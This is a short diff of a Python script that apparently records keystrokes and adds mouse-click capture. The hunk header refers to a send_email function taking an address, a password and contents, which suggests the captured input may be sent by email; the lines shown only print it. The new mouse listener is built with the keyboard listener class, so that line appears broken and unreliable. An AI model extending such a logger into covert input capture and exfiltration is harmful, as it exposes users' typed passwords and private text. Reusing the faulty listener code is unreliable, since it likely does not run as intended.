@@ -38,16 +38,24 @@ def send_email(email_address, password, contents):
 """
 
 class Monitor:
+    # TODO: Log that I thought this'd be a problem!
     def on_press(self, key):
         print(key)
+    
+    def on_click(self, x, y, button, pressed):
+        print('here!')
+        if pressed:
+            print(button)
 
     def __init__(self):
         self.keys = keyboard.Listener(on_press=self.on_press)
+        self.mice = keyboard.Listener(on_click=self.on_click)
     
     def run(self):
         self.keys.start()
-        while True:
-            pass
+        self.mice.start()
+        self.keys.join()
+        self.mice.join()
 
 def main():
     monitor = Monitor()
